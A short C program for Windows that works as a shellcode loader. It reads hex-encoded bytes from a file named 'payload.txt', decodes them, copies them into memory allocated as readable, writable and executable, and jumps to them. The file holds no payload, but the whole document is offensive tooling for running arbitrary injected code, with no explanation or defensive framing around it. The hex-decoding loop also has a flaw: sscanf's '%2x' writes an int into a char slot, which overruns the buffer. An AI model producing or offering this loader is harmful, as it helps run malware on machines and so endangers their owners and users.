#include <stdio.h>
#include <windows.h>

char *read(long *bufSize) {
  FILE *file = fopen("payload.txt", "rb");

  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  rewind(file);

  char *text = (char *)malloc(fileSize + 1);
  fread(text, sizeof(char), fileSize, file);
  text[fileSize] = 0;

  fclose(file);

  *bufSize = fileSize / 2;
  char *buf = (char *)malloc(*bufSize);

  for (size_t i = 0; i < fileSize; i += 2) {
    sscanf(text + i, "%2x", &buf[i / 2]);
  }

  free(text);

  return buf;
}

int main() {
  long bufSize;
  char *buf = read(&bufSize);

  void *ptr = VirtualAlloc(0, bufSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(ptr, buf, bufSize);
  ((void (*)())ptr)();

  free(buf);

  return 0;
}
